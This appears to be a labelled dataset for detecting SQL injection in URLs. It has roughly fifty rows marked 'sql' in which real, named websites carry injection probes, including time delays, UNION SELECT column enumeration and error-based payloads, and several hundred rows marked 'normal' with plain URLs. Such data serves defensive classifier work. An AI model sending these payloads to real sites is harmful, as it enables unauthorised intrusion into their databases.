320,sql,http : / / www . theartofdicktwinney . com / statment . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
321,sql,https : / / place . fi . ncsu . edu / local / catalog / section . php ? id = 1 ) ORDER BY 1 - - zRhc
322,sql,http : / / www2 . ntnu . edu . tw / modules / tinyd0 / index . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu
323,sql,http : / / www . hits . pt / gca / index . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
324,sql,http : / / www . warbears . com / missions . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - ApsM
325,sql,https : / / www . hcilondon . in / pages . php ? id = 5845
326,sql,http : / / www . firstreception . gov . gr / content . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
327,sql,http : / / www . opera - amsterdam . nl / pages . php ? id = 1 % ' ORDER BY 7815 - - mzUV
331,sql,http : / / www . ubraintv . com / watchchannel . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
332,sql,https : / / www . skau . sk / page . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475
333,sql,https : / / www . tukui . org / addons . php ? id = 1 ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( 2513 = 2513
334,sql,http : / / www . semsk . kz / newscat . php ? id = 1 ' ) ORDER BY 1 - - tslS
335,sql,http : / / www . msosocal . com / subpages / leadership_bio . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
336,sql,http : / / pravo . ua / events . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn
337,sql,http : / / www . rainbow . com . my / support . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - sBcc
338,sql,https : / / www . softube . com / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx
339,sql,http : / / www . chicken . org . au / page . php ? id = 1 ' ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( ' eWKx ' = ' eWKx
341,sql,http : / / www . oardc . ohio - state . edu / weedguide / single_weed . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - spUE
343,sql,http : / / bagfa . de / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
344,sql,https : / / likumi . lv / doc . php ? id = ( SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
345,sql,https : / / earthobservatory . nasa . gov / IOTD / view . php ? id = 1 ) ORDER BY 4287 - - vRlT
350,sql,https : / / www . otzyv . ru / read . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
358,sql,http : / / dailyjinnah . com / epaper / page . php ? id = 1 ) WAITFOR DELAY ' 0 : 0 : 5 ' AND ( 5754 = 5754
359,sql,http : / / dailyjinnah . com / epaper / page . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
360,sql,http : / / dailyjinnah . com / epaper / page . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - gXRN
367,sql,https : / / antizapret . info / org . php ? id = 1 ORDER BY 1 - - lAea
368,normal,http : / / www . romanianwriters . ro / s . php ? id = 1
369,normal,http : / / www . bible - history . com / subcat . php ? id = 1
370,normal,http : / / ruscongrmech2015 . ru / index . php ? id = 1
371,normal,http : / / berkeleyrecycling . org / page . php ? id = 1
372,normal,http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1
373,normal,http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1
375,normal,https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1
376,normal,http : / / www . dipintoguitars . com / category . php ? id = 1
377,normal,http : / / www . teamgear . us / store . php ? id = 1
378,normal,http : / / www . multan . gov . pk / files . php ? id = 1
379,normal,http : / / www . asfaa . org / members . php ? id = 1
380,normal,http : / / www . bpc . gov . bd / contactus . php ? id = 1
381,normal,https : / / metacarpolis . com / index . php ? id = 1
382,normal,http : / / www . jbctools . com / cataleg . php ? id = 1
384,normal,http : / / ansobor . ru / page . php ? id = 1
385,normal,http : / / www . khrunichev . ru / main . php ? id = 1
386,normal,http : / / www . studentvote . ca / 2011 / results / index . php ? id = 1
387,normal,https : / / www . orthphoto . net / user . php ? id = 1
388,normal,http : / / esjindex . org / search . php ? id = 1
389,normal,http : / / www . sansihotels . com / hotels . php ? id = 1
390,normal,http : / / www . adopfrance . fr / gb / galerie / index . php ? id = 1
391,normal,http : / / www . akko . org . il / map_en . php ? id = 1
392,normal,http : / / www . paranatural . net / index . php ? id = 1
393,normal,http : / / www . photobiology . org / asp . php ? id = 1
396,normal,http : / / www . stateofdesign . berlin / subevents . php ? id = 1
397,normal,https : / / www . acme . in / contentpage . php ? id = 1
398,normal,http : / / www . komiaviatrans . ru / airport / index . php ? id = 1
399,normal,http : / / www . cdep . ru / index . php ? id = 60 % 26step = 1
400,normal,http : / / www . peml . com / login . php ? rtn_url = http : / / www . peml . com / category . php ? id = 1
401,normal,http : / / www . palfi . net / partners . php ? id = 1
402,normal,http : / / www . sabella . fr / fiche . php ? id = 1
403,normal,http : / / electronautomotive . com / order . php ? id = 1
404,normal,http : / / en . firenze - online . com / shops / florence - shop . php ? id = 1
405,normal,http : / / www . pidsphil . org / journal_info . php ? id = 1
406,normal,http : / / www . egscomics . com / index . php ? id = 1
407,normal,https : / / 100wonders . ru / index . php ? id = 1
408,normal,http : / / www . ifsb . org / membership . php ? id = 1
409,normal,https : / / www . ocsalumni . org / events / cart . php ? id = 1
410,normal,http : / / www . ssy . org / detail . php ? id = 1
411,normal,http : / / www . micwaudio . com / product . php ? id = 1
412,normal,http : / / www . smart - ground . eu / partner . php ? id = 1
413,normal,http : / / www . lambbuilding . co . uk / members / profile . php ? id = 1
414,normal,http : / / www . minutesemeiotic . org / home . php ? id = 1
415,normal,http : / / pedlib . ru / katalogy / katalog . php ? id = 1
416,normal,http : / / bestindustrygroup . com / news . php ? id = 1
417,normal,http : / / cityvis . io / detail . php ? id = 1
418,normal,http : / / www . fairtradegroupnepal . org / about . php ? id = 1
419,normal,http : / / www . cacert . org / index . php ? id = 1
420,normal,http : / / koshi . fr / achat / produit_details . php ? id = 1
421,normal,http : / / vlab . co . in / ba_labs_all . php ? id = 1
422,normal,http : / / ewfed . com / cat . php ? id = 1
423,normal,https : / / www . kunstreservebank . nl / index . php ? id = 1 % 26lang = EN
424,normal,http : / / www . cqfa . ca / public / index . php ? id = 1
425,normal,https : / / www . free - country - flags . com / flag_pack . php ? id = 1
426,normal,http : / / www . carrot - home . com / project . php ? id = 1
427,normal,https : / / www . partnerschulnetz . de / index . php ? id = 562 % 26L = 1
428,normal,https : / / www . albinagroup . com / products . php ? id = 1
429,normal,http : / / modniditky . com / katalog . php ? id = 1
430,normal,http : / / www . evanscartoons . com / gallery . php ? id = 1
431,normal,http : / / paritarian - funds - construction . eu / page . php ? id = 1
432,normal,https : / / www . jannah . ae / hotels . php ? id = 1
433,normal,http : / / www . nm . cz / publikace / publikace - detail - en . php ? id = 1
434,normal,http : / / xn - - 149 - 5cd9ame0ai0a4e5b . xn - - p1ai / page . php ? id = 1
435,normal,http : / / www . daiichisankyo . co . th / aboutus . php ? id = 1
436,normal,http : / / www . epomm . eu / maxeva / index . php ? id = 1
437,normal,http : / / www . skystartravels . com / gallery . php ? id = 1
439,normal,http : / / www . sakhalinprokur . ru / contacts . php ? id = 1
440,normal,http : / / dance . vftsarr . ru / index . php ? id = 1
441,normal,http : / / gtrkchita . ru / listen . php ? id = 1
442,normal,https : / / learnzone . org . uk / courses / course . php ? id = 1
443,normal,http : / / www . jannahplace . com / hotels . php ? id = 1
444,normal,http : / / www . rgcms . edu . in / research . php ? id = 1
445,normal,http : / / www . nordicbook . ru / index . php ? id = 1
446,normal,https : / / vstomp . hotoneaudio . com / ProductsDetail . php ? id = 1
448,normal,http : / / www . strail . de / index . php ? id = 1274 % 26L = 1
449,normal,http : / / www . ohmsghana . com / pages / services . php ? id = 1
450,normal,http : / / www . kvm . co . ke / products . php ? id = 1
451,normal,http : / / www . professor - butakov . ru / history / view_history . php ? id = 1
452,normal,http : / / www . indembassy . be / pages . php ? id = 1
453,normal,http : / / www . smtmax . com / category . php ? id = 15
454,normal,http : / / www . mirraketok . ru / subs . php ? id = 1
455,normal,http : / / www . arion . ru / template . php ? id = 1
456,normal,http : / / www . myappterms . com / reader . php ? id = 1
457,normal,http : / / www . ictet . org / list % 2Bmember . php ? id = 1
459,normal,http : / / www . unifr . ch / form / iaupe_32 / view . php ? id = 1
460,normal,http : / / www . millennium - tech . net / serviceInfo . php ? id = 1
461,normal,http : / / www . jdcaravan . com / store . php ? id = 1
462,normal,https : / / www . nationaloil . co . ke / site / 2 . php ? id = 1
463,normal,https : / / www . crocodile . com . hk / en / webpage . php ? id = 1 % 26tp = 1
464,normal,http : / / www . icona . info / content . php ? id = 1
465,normal,http : / / www1 . clermont . inra . fr / wq / index . php ? id = simul % 26new = 1
466,normal,http : / / www . shorttrackonline . info / web - tv . php ? id = 1
468,normal,http : / / safring . adu . org . za / content . php ? id = 1
469,normal,http : / / www . phpsimplicity . com / tips . php ? id = 1
471,normal,https : / / ticketpay . jp / support_page . php ? id = 1
472,normal,https : / / www . aaaauto . eu / en / users . php ? id = 1
473,normal,http : / / www . mvpvo . ru / inner . php ? id = 1
475,normal,https : / / www . law . cuhk . edu . hk / en / people / info . php ? id = 1
477,normal,https : / / www . cmu . ac . th / en / engaboutcmu . php ? id = 1
478,normal,https : / / www . indianembassythimphu . bt / pages . php ? id = 1
481,normal,https : / / www . tonfly . com / helmet . php ? id = 1
482,normal,http : / / www . polosub . com / scheda_mute_en . php ? id = 1
483,normal,https : / / xn - - 80aaejurlecbd2k8c . xn - - p1ai / index . php ? id = 1
484,normal,http : / / www . sinohytec . com / en / page . php ? id = 1
485,normal,https : / / friendsofscience . org / index . php ? id = 1
486,normal,http : / / www . blessgans . de / index . php ? id = 45 % 26L = 1
487,normal,http : / / www . zentrumexil . at / index . php ? id = 1
488,normal,https : / / www . laboshop . com / index . php ? id = 5 % 26L = 1
489,normal,http : / / www . stalmax . com / index . php ? id = 1
490,normal,https : / / rational . org / index . php ? id = 1
491,normal,https : / / library . geraldika . ru / book . php ? id = 1
492,normal,http : / / www . redtory . com . cn / english / about . php ? id = 1
493,normal,http : / / www . innofader . com / products . php ? id = 1
494,normal,http : / / www . freescience . info / books . php ? id = 1
495,normal,http : / / www . treeviewthai . com / service_en . php ? id = 1
496,normal,http : / / www . ghanatimber . org / certification_details . php ? id = 12
498,normal,http : / / venusita - moda . com / article . php ? id = 1
499,normal,http : / / byglearning . co . uk / mrcrsc - lms / course / category . php ? id = 1
500,normal,http : / / www . mcdonalds . co . jp / quality / allergy_Nutrition / nutrient2 . php ? id = 1
501,normal,http : / / www . energyquest . com . au / reports . php ? id = 1
502,normal,http : / / www . rideitmoto . com / products_list1 . php ? id = 1
504,normal,http : / / www . tdap . gov . pk / trade - bodies . php ? id = 1
505,normal,https : / / www . ileswastesystems . co . uk / index . php ? id = 1
507,normal,https : / / mahara . org / group / view . php ? id = 1
508,normal,http : / / www . palavrion . com / index . php ? id = 1
510,normal,https : / / www . indianembassy . de / pages . php ? id = 1
511,normal,https : / / www . dt - shop . com / index . php ? id = 3 % 26L = 1
512,normal,http : / / www . gulf1bank . com / page . php ? id = 11
513,normal,http : / / www . nsb . gov . bt / publication / publications . php ? id = 1
514,normal,http : / / www . cubana . ru / about . php ? id = 1
515,normal,http : / / nursing . flinders . edu . au / students / studyaids / drugcalculations / page . php ? id = 1
516,normal,http : / / outbacklabs . com / listing . php ? id = 1
517,normal,http : / / www . viparspectra . com / category . php ? id = 1
518,normal,http : / / silverstateenergy . org / announcement . php ? id = 1
519,normal,https : / / edlinked . soe . waikato . ac . nz / research / journal / index . php ? id = 1
520,normal,http : / / www . ausmip . org / main . php ? id = 1
521,normal,http : / / www . realisticky . cz / ucebnice . php ? id = 1
522,normal,http : / / www . pyme . go . cr / cuadro1 . php ? id = 1
523,normal,http : / / www . hrpub . org / journals / jour_info . php ? id = 1
524,normal,http : / / www . ipicshopping . co . za / shopping_centre . php ? id = 1
525,normal,http : / / biblia . deon . pl / rozdzial . php ? id = 1
527,normal,http : / / www . vaughanchinese . com / new / websites / content . php ? id = 1
528,normal,http : / / alphaonenow . org / info . php ? id = 131
529,normal,https : / / polenow . com / login . php ? id = 1 % 26lang = EN
531,normal,http : / / www . justiceforsergei . com / video . php ? id = 1
532,normal,http : / / www . mujahidkamran . com / books . php ? id = 1
533,normal,https : / / www . anglesgallery . com / ssp_director / artistgallery . php ? id = 11
534,normal,http : / / identitiesjournal . edu . mk / cat . php ? id = 1
535,normal,http : / / www . microfinance . lk / member_profile . php ? id = 1
536,normal,http : / / www . aphesa . com / downloads / download2 . php ? id = 1
537,normal,http : / / www . microatena . it / biblioteca . php ? id = 1
538,normal,https : / / www . safari - hotels . com / site / 3 . php ? id = 1
539,normal,http : / / dancingbetty . com / product - list . php ? id = 1
540,normal,http : / / www . terraclean . net / product . php ? id = 1
541,normal,http : / / www . gainwelltravel . com / cms . php ? id = 1
542,normal,http : / / www . morini . ch / product_det . php ? id = 1
543,normal,http : / / www . renexpo - bih . com / index . php ? id = 7 % 26L = 1
545,normal,https : / / learning . thefa . com / totara / program / view . php ? id = 177
546,normal,http : / / www . austinminiatures . com / products . php ? id = 1
547,normal,http : / / kpd1 . ru / catalog . php ? id = 1
548,normal,http : / / www . habibitours . com / cat . php ? id = 1
549,normal,http : / / www . daesgroup . com / region . php ? id = 1
550,normal,http : / / www . ventrilo . com / dlprod . php ? id = 1
551,normal,http : / / www . system16 . com / museum . php ? id = 1
552,normal,http : / / www . stabilizationandtransition . org / Bio . php ? id = 1
553,normal,http : / / www . turbaza - volgograd . ru / viewbase . php ? id = 1
554,normal,http : / / www . sunxtender . com / solarbattery . php ? id = 1
555,normal,http : / / www . cmt - net . org / index . php ? id = 1 % 26L = 1
556,normal,http : / / www . cultuurwijzerapeldoorn . nl / cultuurmenu . php ? id = 1
557,normal,http : / / www . indiainfrastructure . com / shopping_cart . php ? id = 1
558,normal,https : / / www . kianjoocan . com . my / index . php ? id = 1
561,normal,http : / / ska3 . ru / bummi . php ? id = 1
562,normal,http : / / www . caosciotocounty . org / template . php ? id = 1
564,normal,http : / / www . askewsfoods . com / stores . php ? id = 1
565,normal,http : / / www . firstinmichigan . org / stream . php ? id = 1
566,normal,http : / / boywhofell . com / index . php ? id = 1
567,normal,https : / / www . arabculturefund . org / projects / project . php ? id = 1
568,normal,https : / / www . zobodat . at / publikation_series . php ? id = 1
569,normal,http : / / stfranciscountyar . org / page . php ? id = 1
570,normal,http : / / www . harvestlink . com / productsDia . php ? id = 52
571,normal,http : / / www . indiannumismatics . com / products . php ? id = 1
572,normal,http : / / www . integral - eu . com / index . php ? id = 1
573,normal,http : / / www . howtostudy . org / resources_skill . php ? id = 1
574,normal,http : / / www . prazskamuzejninoc . cz / 2017 / clanek . php ? id = 1
576,normal,http : / / netintel . ru / index . php ? id = 41
577,normal,http : / / www . shortrifles . com / configuration . php ? id = 1
579,normal,http : / / www . atmarine . fi / index . php ? id = 2
580,normal,http : / / www . marsfigures . com / main . php ? id = 9
581,normal,http : / / www . rysslandsresor . se / index . php ? id = 1
582,normal,https : / / www . ecabank . com / home / index . php ? id = 95
583,normal,http : / / bram . smartelectronix . com / plugins . php ? id = 1
584,normal,http : / / www . gardenfarmgolf . com / en_locations . php ? id = 1
585,normal,http : / / orgia . ru / about . php ? id = 1
586,normal,http : / / www . goafilms . com / location . php ? id = 1
587,normal,http : / / learnonline . health . nz / course / category . php ? id = 1
588,normal,http : / / www . stasy . gr / index . php ? id = 1 % 26no_cache = 1 % 26L = 1
589,normal,https : / / malffb . gov . vu / index . php ? id = 1
590,normal,http : / / njsfwc . org / projects . php ? id = 21
591,normal,http : / / www . krao . ru / cd - item . php ? id = 1
592,normal,http : / / www . ulagos . cl / contenido03 . php ? id = 1
593,normal,https : / / wciom . ru / index . php ? id = 236 % 26uid = 115707
594,normal,http : / / www . icehalo . ca / products . php ? id = 1
595,normal,http : / / www . vittoria - shoes . com / prodotto . php ? id = 1
596,normal,http : / / mkogan . com / duty . php ? id = 1
597,normal,https : / / koreamed . org / JournalVolume . php ? id = 158
598,normal,http : / / www . skytraktravel . com / services . php ? id = 174
599,normal,http : / / www . uba . ar / academicos / uba21 / contenidos . php ? id = 1
600,normal,http : / / www . isconshanghai . org / web / page . php ? id = 41
601,normal,https : / / www . id . ee / index . php ? id = 31015
603,normal,http : / / pastelspace . com / collection . php ? id = 1
604,normal,https : / / www . sjs . org . hk / en / services / services . php ? id = 1
605,normal,http : / / maximaaa . com / mform / view . php ? id = 1
606,normal,http : / / www . echmb . com / about_details . php ? id = 1
607,normal,https : / / toxtown . nlm . nih . gov / text_version / chemicals . php ? id = 1
608,normal,http : / / www . med . muni . cz / index . php ? id = 1039
609,normal,http : / / len - zoloto . ru / index . php ? id = 1
611,normal,http : / / www . nordiqc . org / epitope . php ? id = 1
612,normal,http : / / meninositu . com . br / galeria / album . php ? id = 1
613,normal,https : / / www . nttgroup . co . za / proc / dealer_detail . php ? id = 1 % 26tid = 1
614,normal,http : / / www . hold . com . tw / product . php ? id = 1
615,normal,http : / / www . catsg . org / index . php ? id = 87
616,normal,http : / / www . theurbanrange . com / poet . php ? id = 1
617,normal,http : / / www . markzaid . com / biography . php ? id = 1
618,normal,http : / / www . markdrum . it / product_detail . php ? id = 1
619,normal,http : / / www . madisonpac . com / key_details . php ? id = 1
620,normal,http : / / pyb . co . uk / cakes - detail . php ? id = 1
621,normal,http : / / www . dengy - vsem . ru / prokrizis_vid . php ? id = 1
622,normal,http : / / one - thebrand . com / cart . php ? id = 0 % 26action = view
623,normal,https : / / www . studyastronomy . com / courses . php ? id = 1
624,normal,http : / / kyoukaigun . jp / visit / detail . php ? id = 1
625,normal,http : / / www . traditionalcottages . gr / page . php ? id = 1 % 26cat = 1 % 26cat2 = 0 % 26lang = 1
626,normal,https : / / primes . utm . edu / top20 / page . php ? id = 1
627,normal,http : / / www . strategictransitions . com / productDetail . php ? id = 1
628,normal,http : / / www . signsinthecity . net / info . php ? id = 1
629,normal,http : / / www . wsid . info / mod / page / view . php ? id = 1
630,normal,http : / / www . walpax . com . br / beachresorts . php ? id = 100
632,normal,http : / / www . czga . ro / pagina . php ? id = 10
633,normal,http : / / victorhospital . com / services . php ? id = 1
634,normal,http : / / www . hrvatskonumizmatickodrustvo . hr / index . php ? id = 1
635,normal,http : / / www . medistock . fr / en / catalogue . php ? id = 1
636,normal,http : / / www . tunesoman . com / product . php ? id = 200
637,normal,https : / / www . agencevu . com / photographers / photographer . php ? id = 1
638,normal,http : / / xn - - 90abdeg4afamkcabfvi7a8q . xn - - p1ai / page . php ? id = 1
639,normal,https : / / www . becker - international . com / index . php ? id = 1 % 26lang = 901
640,normal,http : / / www . mcfolsom . com / page . php ? id = 1
641,normal,http : / / www . world - art . ru / people . php ? id = 1
642,normal,http : / / xn - - n1addli . xn - - p1ai / index . php ? id = 1
643,normal,http : / / www . wenggroup . com / product . php ? id = 1
644,normal,https : / / www . cathouseonthekings . com / video / webcam . php ? id = 1
645,normal,http : / / www . pacific - textiles . com / businesses_facilities . php ? id = 1
646,normal,http : / / www . accessibleireland . com / category . php ? id = 3 % 26id1 = x
647,normal,http : / / www . vaganova . ru / page . php ? id = 265 % 26pid = 265 % 26level = 1
648,normal,http : / / vill . hakuba . nagano . jp / livecam / livecamera . php ? id = 1
649,normal,http : / / www . nagarapro . co . jp / top / artist / artist . php ? id = 1
650,normal,http : / / www . nhf . org . bd / aboutus . php ? id = 1
651,normal,http : / / www . radimpex . rs / download . php ? id = 1 % 26lang = en
652,normal,https : / / pubgshowcase . com / containers . php ? id = 1
653,normal,http : / / www . seehydropower . eu / download_tools / details . php ? id = 1
654,normal,https : / / unite . ut . ee / posts . php ? id = 1
655,normal,http : / / www . arabterm . org / index . php ? id = 3 % 26L = 1
656,normal,https : / / www . forum - pianoteq . com / viewforum . php ? id = 1
657,normal,http : / / www . yitechnology . com / support - faq . php ? id = 1
658,normal,http : / / www . brahmos . com / content . php ? id = 1
659,normal,https : / / www . flapjackfunds . com / program . php ? id = 1
660,normal,http : / / corp . toei - anim . co . jp / en / film / pickup . php ? id = 1
662,normal,http : / / www . iias - trieste - maribor . eu / index . php ? id = 1 % 26L = 1
663,normal,http : / / www . m - e - l . fr / fiche - education - artistique . php ? id = 1
664,normal,http : / / www . rancinan . com / official / photos . php ? id = 1
666,normal,http : / / www . mherc . mb . ca / page . php ? id = 1
667,normal,http : / / molvica . org / vesti_content . php ? id = 1
668,normal,http : / / www . dreamville - bg . com / ru / complex . php ? id = 1
669,normal,http : / / www . thespastudios . com / p . php ? id = 1
670,normal,https : / / www . i - cpan . es / detallePregunta . php ? id = 1
671,normal,http : / / www . tomkane . com / section . php ? id = 1
672,normal,http : / / www . belmos . ru / transp - artcl . php ? id = 1
673,normal,https : / / 74 . ru / forum / view . php ? id = 1000599
674,normal,http : / / www . lecoshop . ru / dir . php ? id = 1
675,normal,http : / / www . jevicko . cz / index . php ? id = 1020 % 26lang = cze
676,normal,http : / / www . vlktravel . com / tour . php ? id = 40
677,normal,http : / / www . anm - conso . com / prof - 03 . php ? id = 1
678,normal,https : / / www . filter . ru / index . php ? id = 50
679,normal,http : / / ohiofoodbanks . org / programs / programs . php ? id = 1
681,normal,http : / / 2017 . tiff - jp . net / ja / lineup / works . php ? id = 1
682,normal,http : / / www . sriaurobindoashram . org / music / sunil / index . php ? id = 1
683,normal,http : / / eurofo . ru / m / viewforum . php ? id = 1
685,normal,http : / / animatch . ca / machform / view . php ? id = 1
686,normal,http : / / www . sydneyshoot . com / buy . php ? id = 1
687,normal,http : / / www . theartofdicktwinney . com / statment . php ? id = 1
688,normal,https : / / place . fi . ncsu . edu / local / catalog / section . php ? id = 1
689,normal,http : / / www2 . ntnu . edu . tw / modules / tinyd0 / index . php ? id = 1
690,normal,http : / / www . hits . pt / gca / index . php ? id = 1
691,normal,http : / / www . warbears . com / missions . php ? id = 1
692,normal,https : / / www . hcilondon . in / pages . php ? id = 1
693,normal,http : / / www . firstreception . gov . gr / content . php ? id = 1
694,normal,http : / / www . opera - amsterdam . nl / pages . php ? id = 1
698,normal,http : / / www . ubraintv . com / watchchannel . php ? id = 6
699,normal,https : / / www . skau . sk / page . php ? id = 1
700,normal,https : / / www . tukui . org / addons . php ? id = 1
701,normal,http : / / www . semsk . kz / newscat . php ? id = 1
702,normal,http : / / www . msosocal . com / subpages / leadership_bio . php ? id = 1
703,normal,http : / / pravo . ua / events . php ? id = 66
704,normal,http : / / www . rainbow . com . my / support . php ? id = 1
705,normal,https : / / www . softube . com / index . php ? id = volume1
706,normal,http : / / www . chicken . org . au / page . php ? id = 1
708,normal,http : / / www . oardc . ohio - state . edu / weedguide / single_weed . php ? id = 1
710,normal,http : / / bagfa . de / index . php ? id = 1
711,normal,https : / / likumi . lv / doc . php ? id = 37967
712,normal,https : / / earthobservatory . nasa . gov / IOTD / view . php ? id = 91903
717,normal,https : / / www . otzyv . ru / read . php ? id = 206652
725,normal,http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = karachi % 26dt = 01 - 04 - 2018
726,normal,http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = islamabad % 26dt = 01 - 04 - 2018
727,normal,http : / / dailyjinnah . com / epaper / page . php ? id = 1 % 26edition = kpk % 26dt = 01 - 04 - 2018
734,normal,https : / / antizapret . info / org . php ? id = 1
